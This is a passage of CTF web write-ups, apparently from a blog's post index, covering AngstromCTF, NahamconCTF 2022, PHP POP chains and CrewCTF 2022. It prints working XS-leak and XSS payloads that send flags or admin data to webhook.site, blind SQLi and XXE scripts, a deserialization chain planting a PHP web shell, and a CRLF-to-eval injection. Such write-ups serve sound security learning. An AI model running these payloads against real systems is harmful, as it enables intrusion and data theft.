trick solved the problem. He used the XSS vulnerability from Xtra Salty Sardines challenge to exploit. Both https://sustenance.web.actf.co/ and https://xtra-salty-sardines.web.actf.co/ were treated as same site because of having the same eTLD+1 - actf.co.Here is his exploit script:&amp;lt;&amp;gt;&#39;&quot;;&amp;lt;form action=&#39;https://sustenance.web.actf.co/s&#39; method=POST&amp;gt;&amp;lt;input id=f /&amp;gt;&amp;lt;input name=search value=a /&amp;gt;&amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; const $ = document.querySelector.bind(document); const sleep = (ms) =&amp;gt; new Promise(r =&amp;gt; setTimeout(r, ms)); let i = 0; const stuff = async(len = 3500) =&amp;gt; { let name = Math.random(); $(&quot;form&quot;).target = name; let w = window.open(&#39;&#39;, name); $(&quot;#f&quot;).value = &quot;_&quot;.repeat(len); $(&quot;#f&quot;).name = i++; $(&quot;form&quot;).submit(); await sleep(100); }; const isError = async(url) =&amp;gt; { return new Promise(r =&amp;gt; { let script = document.createElement(&#39;script&#39;); script.src = url; script.onload = () =&amp;gt; r(false); script.onerror = () =&amp;gt; r(true); document.head.appendChild(script); }); } const search = (query) =&amp;gt; { return isError(&quot;https://sustenance.web.actf.co/q?q=&quot; + encodeURIComponent(query)); }; const alphabet = &quot;etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ&quot;; const url = &quot;//webhook.site/fe29ff9f-908c-4508-9bbd-14848cf2c3f8&quot;; let known = &quot;actf{&quot;; window.onload = async() =&amp;gt; { navigator.sendBeacon(url + &quot;?load&quot;); await Promise.all([stuff(), stuff(), stuff(), stuff()]); await stuff(1600); navigator.sendBeacon(url + &quot;?go&quot;); while (true) { for (let c of alphabet) { let query = known + c; if (await search(query)) { navigator.sendBeacon(url, query); known += c; break; } } } }; &amp;lt;/script&amp;gt;Promise.all() was used to increase the cookie‚Äôs size slowly because sending tons of cookie in one request will get a 502 Bad Gateway status.One thing @Strellic didn‚Äôt indicate in his solution is the maximum size of request header. Using Burp Suite i noted that remote server used HTTP/2 module and nginx as web server. After spending a couple of minutes on searching, i came across this site. According to it, the maxium size is 16k in default so we can adjust the len in stuff() to make it barely under the limit.Send payload:payloadResult:resultCache probingAfter reading and trying a lot of exploit techniques in xs-leak wiki, I finally thought about cache probing. But in the end i think it is too complicated so i decide to skip it and wait for the writeup üòî.You can read the original writeup from this and this blog.The idea is to abuse the cache, if the returned response is ‚Äúsucceeded‚Äù then it will be cache with the cache key ...?m=your search that took place at &amp;lt;Date.now()&amp;gt; has succed ... require sustenance so we can use fetch with cache: &#39;force-cache&#39; and bruteforce the Date.now() value to measure the response‚Äôs time. If the time is small than the ‚Äúbase time‚Äù than it is likely that the flag contains the current bruteforcing character.Assuming that cache partitioning workedThere is still one problem we have to come over. Now, Chrome will partition its HTTP cache starting in Chrome 86 (Gaining security and privacy by partitioning the cache). With cache partitioning, cached resources will be keyed using a new ‚ÄúNetwork Isolation Key‚Äù in addition to the resource URL. The Network Isolation Key is composed of the top-level site and the current-frame site.So if you plan to place your exploit script in a page (for example it is hosted by ngrok), the cache key will be (https://id.ngrok.io, https://id.ngrok.io, https://sustenance.web.actf.co/?m=...) but the expected cache key should be (https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =...) in order to make the cache shareable. By using the Strellic‚Äôs trick above, we can easily solve the problem. Beside, the cookie attribute is SameSite=Lax (explained above) so we have to use window.open for top-level navigations ortherwise the cookie won‚Äôt be sent!&amp;lt;&amp;gt;&quot;&#39;;&amp;lt;script&amp;gt;// to hang the connectionfetch(&#39;https://deelay.me/20000/https://example.com&#39;)// NOTE: we will calculate this baseline before doing the attackvar baseLine = 3.2const sleep = ms =&amp;gt; new Promise((resolve) =&amp;gt; setTimeout(resolve, ms))go()async function go() { await calculateBaseline() main() async function calculateBaseline() { var m = Math.random() let win = window.open(&#39;https://sustenance.web.actf.co/?m=cached_&#39; + m) // NOTE: this number can be decreased by detecting window load await sleep(500) win.close() let total = 0 for(let i=1; i&amp;lt;=5; i++) { let ts = await getLoadTime(&#39;https://sustenance.web.actf.co/?m=cached_&#39; + m) total += ts report(`Cached time, round: ${i}, ${ts}ms`) } // NOTE: 0.5 is just a random guess baseLine = (total/5) + 0.5 report(`Baseline: ${baseLine}`) // NOTE: adjust baseline, should not be more than 3 ms based on previous testing if (baseLine &amp;gt; 3) { baseLine = 3 } for(let i=1; i&amp;lt;=3; i++) { let ts = await getLoadTime(&#39;https://sustenance.web.actf.co/?m=not_cached_&#39; + m) report(`Not Cached time, round: ${i}, ${ts}ms`) } } // NOTE: server is quite fast so no need to set timeout async function getLoadTime(url) { const start = performance.now() await fetch(url, { cache: &#39;force-cache&#39;, mode: &#39;no-cors&#39; }) return performance.now() - start } // function to bruteforce the successful search function genSucceedUrl(t) { let ft = t + &#39;&#39; while(ft.length &amp;lt; 13) { ft += &#39;0&#39; } const status = &quot;succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance&quot;; return &#39;https://sustenance.web.actf.co/?m=&#39; + encodeURIComponent(`your search that took place at ${ft} has ${status}`); } async function isCached(str) { let start = +new Date() let win = window.open(`https://sustenance.web.actf.co/q?q=` + encodeURIComponent(str)) await sleep(500) win.close() // NOTE: base on the data collected, i should be 1~20, pretty small number for(let i=1; i&amp;lt;=30; i++) { const url = genSucceedUrl(start + i) let loadTime = await getLoadTime(url) if (loadTime &amp;lt;= baseLine) { // NOTE: check again to see if it really meets the condition let total = 0 for(let j=1; j&amp;lt;=3; j++) { total += await getLoadTime(url) } total/=3 if (total &amp;lt;= baseLine) { report(`isCached success, str=${str}, i=${i}, start=${start}, total=${total}`) return true } } } return false } async function main() { let flag = &#39;actf{yummy_&#39; // NOTE: we can leak the charset first to speed up the process let chars = &#39;acefsmntuy_}&#39;.split(&#39;&#39;) while(flag[flag.length - 1] !== &#39;}&#39;) { for(let char of chars) { report(&#39;trying:&#39; + flag + char) if (await isCached(flag + char)) { flag += char report(&#39;flag:&#39; + flag) break } } } } async function report(data) { console.log(data) // TODO: change to your VPS return fetch(&#39;https://YOUR_VPS/&#39;, { method: &#39;POST&#39;, body: data, mode: &#39;no-cors&#39; }).catch(err =&amp;gt; err); }}&amp;lt;/script&amp;gt;There is no cache partitioningSome people find out the fact that cache partitioning didn‚Äôt work in headless chrome (this one is an example).So you can use the previous script on your page, host it by ngrok and submit this url to admin." }, { "title": "NahamconCTF 2022", "url": "/posts/nahamconctf2022/", "categories": "WebSec, CTF", "tags": "xss, xxe, sqli", "date": "2022-05-01 01:10:00 +0700", "snippet": "Solution for some web challengessolved challengesEXtravagantUpload exp.xml and view it&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;/var/www/flag.txt&quot;&amp;gt; ]&amp;gt;&amp;lt;foo&amp;gt;&amp;amp;xxe;&amp;lt;/foo&amp;gt; flag{639b72f2dd0017f454c44c3863c4e195}Jurassic Parkaccess robots.txtPersonnelexploit script:import requestsimport reTARGET = &quot;http://challenge.nahamcon.com:30349/&quot;r = requests.post(TARGET, data={&quot;name&quot;: &quot;1|(flag.*)|1&quot;, &quot;setting&quot;:0})flag = re.search(r&quot;&amp;lt;li&amp;gt;(flag.*)&amp;lt;/li&amp;gt;&quot;, r.text).group(1)print(&quot;[-] FLAG: &quot; + flag) flag{f0e659b45b507d8633065bbd2832c627}Flaskmetal AlchemistFrom requirements.txt, server uses SQLAlchemy==1.2.17 and it is vulnerable to sqli.exploit script:import requestsimport stringTARGET = &quot;http://challenge.nahamcon.com:30378/&quot;FLAG_LENGTH = 0# Find flag lengthfor i in range(30): order_by_inject = f&quot;(SELECT CASE WHEN ((SELECT LENGTH(flag) from flag) = {i+1}) THEN atomic_number ELSE symbol END)&quot; data = {&quot;search&quot; : &quot;a&quot;, &quot;order&quot;: order_by_inject} r = requests.post(TARGET, data) # with this payload, &quot;aotomic number&quot; column will return &quot;89&quot; before &quot;12&quot; if the WHEN condition is true if r.text.find(&quot;89&amp;lt;/td&amp;gt;&quot;) &amp;gt; r.text.find(&quot;12&amp;lt;/td&amp;gt;&quot;): FLAG_LENGTH = i+1 print(f&quot;[-] Flag length: {FLAG_LENGTH}&quot;) break# Find flagFLAG = &quot;&quot;for i in range(FLAG_LENGTH): for c in string.ascii_lowercase + &quot;_}{&quot;: order_by_inject = f&quot;(SELECT CASE WHEN ((SELECT SUBSTR(flag, {i+1}, 1) from flag) = &#39;{c}&#39;) THEN atomic_number ELSE symbol END)&quot; data = {&quot;search&quot; : &quot;a&quot;, &quot;order&quot;: order_by_inject} r = requests.post(TARGET, data) if r.text.find(&quot;89&amp;lt;/td&amp;gt;&quot;) &amp;gt; r.text.find(&quot;12&amp;lt;/td&amp;gt;&quot;): FLAG += c print(f&quot;[-] Flag: {FLAG}&quot;) break flag{order_by_blind}Hacker TsThe page renders text on t-shirts based on POST text param.x=new XMLHttpRequest;x.onload=function(){x1=new XMLHttpRequest;x1.open(&quot;GET&quot;,&quot;https://webhook.site/f61d8f20-bc48-4ae9-805f-3db7a842363b?c=&quot;%2bencodeURIComponent(btoa(this.responseText)));x1.send();};x.open(&quot;GET&quot;,&quot;http://localhost:5000/admin&quot;);x.send();webhook receives request:resultflagTwo For OneThis is a two factor authentication challenge using password and OTP.The feedback features in Settings page is vulnerable to blind XSSSolve steps: reset 2FA -&amp;gt; reset admin account‚Äôs password -&amp;gt; login as admin -&amp;gt; get flagGet new otp auth value var x = new XMLHttpRequest(); x.open(&#39;POST&#39;, &#39;http://challenge.nahamcon.com:32084/reset2fa&#39;); x.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json&quot;); x.setRequestHeader(&quot;Accept&quot;, &quot;application/json&quot;); x.onload = function() { navigator.sendBeacon(&#39;https://webhook.site/8771a7aa-4464-438a-84ac-7311eae5bd87&#39;, this.responseText); }; x.send();otp authGenerate new admin‚Äôs qr code&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt; &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt; &amp;lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&amp;gt; &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&amp;gt; &amp;lt;title&amp;gt;QR code page&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;div class=&quot;row&quot;&amp;gt; &amp;lt;div class=&quot;col-12&quot;&amp;gt; &amp;lt;canvas id=&quot;qr&quot; style=&quot;margin-right: auto; margin-left: auto;&quot;&amp;gt;&amp;lt;/canvas&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;script&amp;gt; var qr = new QRious({ size: 250, element: document.getElementById(&#39;qr&#39;), value: &quot;otpauth://totp/Fort%20Knox:admin?secret=QFBPNXXUIQ6D3LAD&amp;amp;issuer=Fort%20Knox&quot; }); &amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;new admin qr codeReset admin password var x = new XMLHttpRequest(); x.open(&#39;POST&#39;, &#39;http://challenge.nahamcon.com:30223/reset_password&#39;); x.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json&quot;); x.setRequestHeader(&quot;Accept&quot;, &quot;application/json&quot;); x.onload = function() { navigator.sendBeacon(&#39;https://webhook.site/8771a7aa-4464-438a-84ac-7311eae5bd87&#39;, this.responseText); }; x.send(JSON.stringify({ otp: &quot;063517&quot;, password: &quot;to^&quot;, password2: &quot;to^&quot; }));Finally, login and view flagflag" }, { "title": "PHP POP Chain", "url": "/posts/phpPopChain/", "categories": "WebSec, CTF", "tags": "pop chain", "date": "2022-04-22 22:27:00 +0700", "snippet": "·ªû post n√†y m√¨nh s·∫Ω vi·∫øt v·ªÅ c√°ch khai th√°c PHP POP Chain m√† m√¨nh h·ªçc ƒë∆∞·ª£c qua c√°c b√†i CTF.PHP POP Chain c√≤n ƒë∆∞·ª£c g·ªçi l√† Code Reuse Attack l√† m·ªôt kƒ© thu·∫≠t ho·∫°t ƒë·ªông d·ª±a tr√™n vi·ªác s·ª≠ d·ª•ng c√°c ƒëo·∫°n code c√≥ s·∫µn (gadget) v√† li√™n k·∫øt (chain) ch√∫ng l·∫°i v·ªõi nhau ƒë·ªÉ l√†m thay ƒë·ªïi lu·ªìng th·ª±c thi c·ªßa ch∆∞∆°ng tr√¨nh theo √Ω mu·ªën c·ªßa attacker.Th∆∞·ªùng th√¨ kƒ© thu·∫≠t n√†y s·∫Ω ƒë∆∞·ª£c √°p d·ª•ng khi m·ªôt serialized object ƒë∆∞·ª£c ƒë∆∞a v√†o h√†m unserialize() v√† s·ª≠ d·ª•ng ƒë·ªìng th·ªùi c√°c magic methods ƒë·ªÉ chain gadgets l·∫°i v·ªõi nhau.pop chain step1. Ezpop - mrctf2020Link challengehttps://buuoj.cn/challenges#[MRCTF2020]EzpopOverviewoverviewSource&amp;lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ $this-&amp;gt;append($this-&amp;gt;var); }}class Show{ public $source; public $str; public function __construct($file=&#39;index.php&#39;){ $this-&amp;gt;source = $file; echo &#39;Welcome to &#39;.$this-&amp;gt;source.&quot;&amp;lt;br&amp;gt;&quot;; } public function __toString(){ return $this-&amp;gt;str-&amp;gt;source; } public function __wakeup(){ if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&amp;gt;source)) { echo &quot;hacker&quot;; $this-&amp;gt;source = &quot;index.php&quot;; } }}class Test{ public $p; public function __construct(){ $this-&amp;gt;p = array(); } public function __get($key){ $function = $this-&amp;gt;p; return $function(); }}if(isset($_GET[&#39;pop&#39;])){ @unserialize($_GET[&#39;pop&#39;]);}else{ $a=new Show; highlight_file(__FILE__);}Ph√¢n t√≠chpop get param s·∫Ω ƒë∆∞·ª£c unserialize n·∫øu ƒë∆∞·ª£c g·ª≠i ƒë·∫øn server. L∆∞·ªõt l√™n tr√™n ta th·∫•y class Show c√≥ khai b√°o m·ªôt magic methods l√† __wakeup -&amp;gt; ƒë√¢y l√† first gadget. Class Modifier c√≥ ch·ª©a m·ªôt method ƒë·∫∑c bi·ªát __invoke- ‚ÄúThe __invoke() method is called when a script tries to call an object as a function.‚Äù -&amp;gt; d√πng h√†m n√†y ƒë·ªÉ include flag.php -&amp;gt; last gadget.M√¨nh s·∫Ω l·ª£i d·ª•ng __toString v√† __wakeup c·ªßa class Show. H√†m preg_match s·ª≠ d·ª•ng $this-&amp;gt;source l√†m tham s·ªë th·ª© 2 v√¨ v·∫≠y n·∫øu g√°n source = new Show() th√¨ s·∫Ω trigger ƒë∆∞·ª£c __toStringTi·∫øp t·ª•c h√†m __toString g·ªçi ƒë·∫øn $this-&amp;gt;str-&amp;gt;source suy ra n·∫øu ta g√°n str = new Test() th√¨ s·∫Ω t∆∞∆°ng ƒë∆∞∆°ng v·ªõi new Test()-&amp;gt;source -&amp;gt; trigger __get c·ªßa class Test. T·ªõi ƒë√¢y mu·ªën chain t·ªõi gadget cu·ªëi th√¨ c·∫ßn g√°n p = new Modifier() v√† ·ªü Modifier g√°n cho var=&#39;php://filter/convert.base64-encode/resource=flag.php&#39; l√† xong.Khai th√°cexploit code:&amp;lt;?phpclass Modifier { protected $var = &#39;php://filter/convert.base64-encode/resource=flag.php&#39;;}class Test{ public $p; public function __construct(){ $this-&amp;gt;p = new Modifier(); }}class Show{ public $source; public $str;}$a = new Show();$a -&amp;gt; source = new Show();$a -&amp;gt; source -&amp;gt; str = new Test();echo urlencode(serialize($a));?&amp;gt;send payloadflag.php flag{9f937575-162d-4d4b-8030-c8859c08ac19}2. EzPOP - EIS2019Link challengehttps://buuoj.cn/challenges#[EIS%202019]EzPOPSource&amp;lt;?phperror_reporting(0);class A { protected $store; protected $key; protected $expire; public function __construct($store, $key = &#39;flysystem&#39;, $expire = null) { $this-&amp;gt;key = $key; $this-&amp;gt;store = $store; $this-&amp;gt;expire = $expire; } public function cleanContents(array $contents) { $cachedProperties = array_flip([ &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;, &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;, ]); foreach ($contents as $path =&amp;gt; $object) { if (is_array($object)) { $contents[$path] = array_intersect_key($object, $cachedProperties); } } return $contents; } public function getForStorage() { $cleaned = $this-&amp;gt;cleanContents($this-&amp;gt;cache); return json_encode([$cleaned, $this-&amp;gt;complete]); } public function save() { $contents = $this-&amp;gt;getForStorage(); $this-&amp;gt;store-&amp;gt;set($this-&amp;gt;key, $contents, $this-&amp;gt;expire); } public function __destruct() { if (!$this-&amp;gt;autosave) { $this-&amp;gt;save(); } }}class B { protected function getExpireTime($expire): int { return (int) $expire; } public function getCacheKey(string $name): string { return $this-&amp;gt;options[&#39;prefix&#39;] . $name; } protected function serialize($data): string { if (is_numeric($data)) { return (string) $data; } $serialize = $this-&amp;gt;options[&#39;serialize&#39;]; return $serialize($data); } public function set($name, $value, $expire = null): bool{ $this-&amp;gt;writeTimes++; if (is_null($expire)) { $expire = $this-&amp;gt;options[&#39;expire&#39;]; } $expire = $this-&amp;gt;getExpireTime($expire); $filename = $this-&amp;gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) { try { mkdir($dir, 0755, true); } catch (\\Exception $e) { // Failed to create } } $data = $this-&amp;gt;serialize($value); if ($this-&amp;gt;options[&#39;data_compress&#39;] &amp;amp;&amp;amp; function_exists(&#39;gzcompress&#39;)) { // data compression $data = gzcompress($data, 3); } $data = &quot;&amp;lt;?php\\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\\n exit();?&amp;gt;\\n&quot; . $data; $result = file_put_contents($filename, $data); if ($result) { return true; } return false; }}if (isset($_GET[&#39;src&#39;])){ highlight_file(__FILE__);}$dir = &quot;uploads/&quot;;if (!is_dir($dir)){ mkdir($dir);}unserialize($_GET[&quot;data&quot;]);Ph√¢n t√≠chTho·∫°t nh√¨n v√†o ƒëo·∫°n code n√†y th√¨ m√¨nh ph√°t hi·ªán m·ªôt th·ª© kh√° th√∫ v·ªã file_put_contents xu·∫•t hi·ªán ·ªü class B trong h√†m set(), h√†m n√†y th·ª±c hi·ªán vi·ªác ghi $data v√†o $filename =&amp;gt; c√≥ th·ªÉ t·∫≠n d·ª•ng ƒë·ªÉ ghi m·ªôt php shell tr√™n server üòã. Ta s·∫Ω c√πng truy ng∆∞·ª£c l·∫°i c√°c gi√° tr·ªã li√™n quan t·ªõi ch√∫ng. filename: ƒë∆∞·ª£c g√°n b·∫±ng $this-&amp;gt;getCacheKey($name) v·ªõi $name l√† tham s·ªë truy·ªÅn v√†o v√† ƒë∆∞·ª£c prepend v·ªõi m·ªôt gi√° tr·ªã trong options[&#39;prefix&#39;] c·ªßa class. public function getCacheKey(string $name): string { return $this-&amp;gt;options[&#39;prefix&#39;] . $name; } data: ƒë∆∞·ª£c g√°n b·∫±ng $this-&amp;gt;serialize($value) v·ªõi $value l√† tham s·ªë truy·ªÅn v√†o v√† $serialize l·∫•y t·ª´ m·ªôt gi√° tr·ªã trong options[&#39;serialize&#39;] c·ªßa class. protected function serialize($data): string { if (is_numeric($data)) { return (string) $data; } $serialize = $this-&amp;gt;options[&#39;serialize&#39;]; return $serialize($data); } expire: ƒë∆∞·ª£c g√°n b·∫±ng $this-&amp;gt;getExpireTime($expire); v·ªõi $expire l√† tham s·ªë truy·ªÅn v√†o protected function getExpireTime($expire): int { return (int) $expire; } Nh∆∞ng ·ªü ƒë√¢y n·∫£y sinh ra m·ªôt v·∫•n ƒë·ªÅ ü§î, v√¨ $data = &quot;&amp;lt;?php\\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\\n exit();?&amp;gt;\\n&quot; . $data; $data truy·ªÅn v√†o m·∫∑c d√π l√† m·ªôt ‚ÄúUser-Controllable Input‚Äù nh∆∞ng b·ªüi v√¨ ƒë∆∞·ª£c append v√†o cu·ªëi chu·ªói n√™n khi th·ª±c thi shell th√¨ s·∫Ω tho√°t do exit(). ƒê√¢y l√† m·ªôt b√†i post hay v·ªÅ c√°c c√°ch bypass h√†m n√†yv√† m√¨nh s·∫Ω l√†m theo c√°ch base64 decode.ƒê·∫øn ƒë√¢y ta bi·∫øt ƒë∆∞·ª£c last gadget s·∫Ω l√† method set() c·ªßa class B v·∫≠y class A s·∫Ω l√†m nhi·ªám v·ª• chain t·ªõi B. Nh√¨n l·∫°i source th√¨ m√¨nh ph√°t hi·ªán ƒë∆∞·ª£c magic method __destruct g·ªçi t·ªõi save() ·ªü trong save() g·ªçi $this-&amp;gt;store-&amp;gt;set($this-&amp;gt;key, $contents, $this-&amp;gt;expire); =&amp;gt; c·∫ßn g√°n store = new class B(). V√† $key, $content, $expire s·∫Ω ·ª©ng v·ªõi $name, $value, $expire key = ‚Äúshell.php‚Äù expire g√°n ƒë·∫°i b·∫±ng ‚Äúbla‚Äù. content ƒë∆∞·ª£c g√°n b·∫±ng return value c·ªßa $this-&amp;gt;getForStorage();, m√¨nh s·∫Ω contruct sao cho getForStorage() tr·∫£ v·ªÅ [[],&quot;PD9jdWMgY3VjdmFzYigpOz8+&quot;] $cache = array(); $complete = base64_encode(&quot;xxx&quot;.base64_encode(&#39;&amp;lt;?php system($_GET[\\&#39;cmd\\&#39;])?&amp;gt;&#39;)); ·ªü ƒë√¢y c·∫ßn th√™m v√†o tr∆∞·ªõc 3 k√≠ t·ª± b·ªüi v√¨ &amp;lt;?php\\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\\n exit();?&amp;gt;\\n s·∫Ω bi·∫øn th√†nh php//000000000000exit khi d√πng php wrapper -&amp;gt; length = 21, m√† m·ªôt nh√≥m ch·ª©a 4 k√≠ t·ª± base64 s·∫Ω ƒë∆∞·ª£c decode th√†nh 3 bytes n√™n ta ph·∫£i th√™m 3 bytes xxx v√†o tr∆∞·ªõc ƒë·ªÉ tr√°nh l√†m ‚Äúh·ªèng‚Äù web shell. Sau c√πng $value=&quot;W1tdLCJQRDl3YUhBZ2MzbHpkR1Z0S0NSZlIwVlVXeWRqYldRblhTa1wvUGc9PSJd&quot; n√™n ·ªü ƒëo·∫°n code $data = $this-&amp;gt;serialize($value); c·∫ßn base64 decode tr·ªü l·∫°i v√† $data s·∫Ω b·∫±ng [[],&quot;PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk\\/Pg==&quot;] -&amp;gt; $this-&amp;gt;options[&#39;serialize&#39;] = &quot;base64_decode&quot;. L·∫ßn decode cu·ªëi c√πng l√† l√∫c ghi v√†o file shell.php d√πng php wrapper v√† l∆∞u √Ω c√°c k√≠ t·ª± kh√¥ng h·ª£p l·ªá s·∫Ω b·ªã b·ªè qua.Cu·ªëi c√πng ƒë·ªÉ ghi th√†nh c√¥ng m·ªôt php shell l√™n server ch·ªâ c·∫ßn set $this-&amp;gt;options[&#39;prefix&#39;] = &#39;php://filter/write=convert.base64-decode/resource=&#39; ü§óKhai th√°cK·∫øt qu·∫£:result flag{94d92ddd-e935-46d4-93ef-f4fb272bd81c}T√†i li·ªáu tham kh·∫£ohttps://websec.files.wordpress.com/2010/11/rips_ccs.pdfhttps://vickieli.dev/insecure%20deserialization/pop-chains/https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list" }, { "title": "CrewCTF 2022", "url": "/posts/crewctf2022/", "categories": "WebSec, CTF", "tags": "sqli, timing attack, rce, race condition", "date": "2022-04-17 19:57:00 +0700", "snippet": "·ªû post m√¨nh s·∫Ω vi·∫øt writeup cho 4/7 b√†i web c·ªßa gi·∫£i crewctf2022 m√† m√¨nh gi·∫£i ƒë∆∞·ª£c.1. CuaaSB√†i n√†y ch·ªâ ƒë∆°n gi·∫£n l√† ƒë·ªçc v√† hi·ªÉu ƒë∆∞·ª£c c√°ch ho·∫°t ƒë·ªông c·ªßa trang web th√¨ s·∫Ω gi·∫£i ra.Link challengehttp://193.105.207.19:5001/Source codeDownloadOverviewoverviewPh√¢n t√≠chƒê·ªÅ cho ch√∫ng ta hai file index.php, cleaner.php v√† php.ini - m·ªôt file ƒë·ªÉ c·∫•u h√¨nh php web serverindex.php:&amp;lt;?phpif($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot; and isset($_POST[&#39;url&#39;])) { clean_and_send($_POST[&#39;url&#39;]); } function clean_and_send($url){ $uncleanedURL = $url; // should be not used anymore $values = parse_url($url); $host = explode(&#39;/&#39;,$values[&#39;host&#39;]); $query = $host[0]; $data = array(&#39;host&#39;=&amp;gt;$query); $cleanerurl = &quot;http://127.0.0.1/cleaner.php&quot;; $stream = file_get_contents($cleanerurl, true, stream_context_create([&#39;http&#39; =&amp;gt; [ &#39;method&#39; =&amp;gt; &#39;POST&#39;, &#39;header&#39; =&amp;gt; &quot;X-Original-URL: $uncleanedURL&quot;, &#39;content&#39; =&amp;gt; http_build_query($data) ] ])); echo $stream; }?&amp;gt;Ch·ª©c nƒÉng: nh·∫≠n bi·∫øn url t·ª´ method POST sau ƒë√≥ ƒë∆∞a v√†o h√†m clean_and_send ƒë·ªÉ x·ª≠ l√≠. Hai d√≤ng code ƒë√°ng ch√∫ √Ω l√† $uncleanedURL = $url; v√† &#39;header&#39; =&amp;gt; &quot;X-Original-URL: $uncleanedURL&quot;, bi·∫øn url g·ª≠i l√™n server ƒë∆∞·ª£c ƒë∆∞a tr·ª±c ti·∫øp v√†o header option c·ªßa stream_context_create v√† context n√†y d√πng l√†m tham s·ªë th·ª© 3 cho file_get_contents v·ªõi filename l√† http://127.0.0.1/cleaner.php -&amp;gt; c√≥ th·ªÉ hi·ªÉu l√† g·ª≠i POST request t·ªõi http://127.0.0.1/cleaner.php d·ª±a tr√™n context.cleaner.php:&amp;lt;?phpif ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;){die(&quot;&amp;lt;img src=&#39;https://imgur.com/x7BCUsr.png&#39;&amp;gt;&quot;);}echo &quot;&amp;lt;br&amp;gt;There your cleaned url: &quot;.$_POST[&#39;host&#39;];echo &quot;&amp;lt;br&amp;gt;Thank you For Using our Service!&quot;;function tryandeval($value){ echo &quot;&amp;lt;br&amp;gt;How many you visited us &quot;; eval($value); }foreach (getallheaders() as $name =&amp;gt; $value) { if ($name == &quot;X-Visited-Before&quot;){ tryandeval($value); }}?&amp;gt;File s·∫Ω check xem n·∫øu t·ªìn t·∫°i header X-Visited-Before th√¨ g·ªçi h√†m tryandeval() -&amp;gt; eval() ƒë∆∞·ª£c th·ª±c thi. V√¨ v·∫≠y m·ª•c ti√™u c·ªßa m√¨nh s·∫Ω l√†m sao cho xu·∫•t hi·ªán ƒë∆∞·ª£c header n√†y v√† RCE t√¨m flag.Quay l·∫°i ƒë·ªçc docs c·ªßa stream_context_create m√¨nh t√¨m ra ƒë∆∞·ª£c c√°ch ƒë·ªÉ truy·ªÅn nhi·ªÅu headerFile php.ini m√† b√†i cung c·∫•p disable 1 v√†i functions:disable_functions = proc_open, popen, disk_free_space, diskfreespace, set_time_limit, leak, tmpfile, exec, system, passthru, show_source, system, phpinfo, pcntl_alarm, pcntl_fork, pcntl_waitpid, pcntl_wait, pcntl_wifexited, pcntl_wifstopped, pcntl_wifsignaled, pcntl_wexitstatus, pcntl_wtermsig, pcntl_wstopsig, pcntl_signal, pcntl_signal_dispatch, pcntl_get_last_error, pcntl_strerror, pcntl_sigprocmask, pcntl_sigwaitinfo, pcntl_sigtimedwait, pcntl_exec, pcntl_getpriority, pcntl_setpriorityNh∆∞ng v·∫´n ‚Äúch·ª´a‚Äù l·∫°i 1 v√†i h√†m ch·∫≥ng h·∫°n nh∆∞ shell_exec c√≥ th·ªÉ d√πng ƒë∆∞·ª£c.Khai th√°c $url = &quot;http://example.com\\r\\nX-Visited-Before: echo shell_exec(&#39;cat /maybethisistheflag&#39;);&quot;; echo urlencode($url); K·∫øt qu·∫£:response crew{crlF_aNd_R357r1C73D_Rc3_12_B0R1nG}2. UploadzB√†i n√†y thu·ªôc d·∫°ng ‚Äúrace condition with file upload‚Äù, c√°c b·∫°n ch∆∞a quen v·ªõi race condition th√¨ c√≥ th·ªÉ ƒë·ªçc s∆° qua b√†i vi·∫øt n√†yLink challengehttps://uploadz-web.crewctf-2022.crewc.tf/Source codeDownloadOverviewoverviewPh√¢n t√≠chB√†i cho c√°c file: index.php, .htaccess, my-apache2.conf v√† m·ªôt v√†i file kh√°c ƒë·ªÉ d·ª±ng local.index.php:&amp;lt;?php function create_temp_file($temp,$name){ $file_temp = &quot;storage/app/temp/&quot;.$name; copy($temp,$file_temp); return $file_temp; } function gen_uuid($length=6) { $keys = array_merge(range(&#39;a&#39;, &#39;z&#39;), range(&#39;A&#39;, &#39;Z&#39;)); for($i=0; $i &amp;lt; $length; $i++) { $key .= $keys[array_rand($keys)]; } return $key;} function move_upload($source,$des){ $name = gen_uuid(); $des = &quot;storage/app/uploads/&quot;.$name.$des; copy($source,$des); sleep(1);// for loadblance and anti brute unlink($source); return $des; } if (isset($_FILES[&#39;uploadedFile&#39;])) { // get details of the uploaded file 